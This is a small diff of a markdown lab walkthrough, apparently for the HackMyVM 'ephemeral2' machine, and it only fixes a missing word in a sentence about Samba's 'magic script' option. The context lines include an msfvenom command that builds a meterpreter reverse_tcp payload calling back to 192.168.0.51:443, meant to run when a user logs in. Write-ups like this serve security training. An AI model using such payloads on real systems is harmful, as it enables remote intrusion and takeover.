@@ -361,7 +361,7 @@ I've not seen the `magic script` option before, but a quick google search  I fou
 
 ![[Pasted image 20240811200236.png]]
 
-So basically, when a user logs in, the or program that the `magic script` points to gets executed. I will create a meterpreter payload using msfvenom, save it as `smbscript.elf` and upload it:
+So basically, when a user logs in, the script or program that the `magic script` points to gets executed. I will create a meterpreter payload using msfvenom, save it as `smbscript.elf` and upload it:
 
 ```bash
 garffff@garffff:~/hackmyvm/ephemeral2$ sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=443 -f elf > smbscript.elf
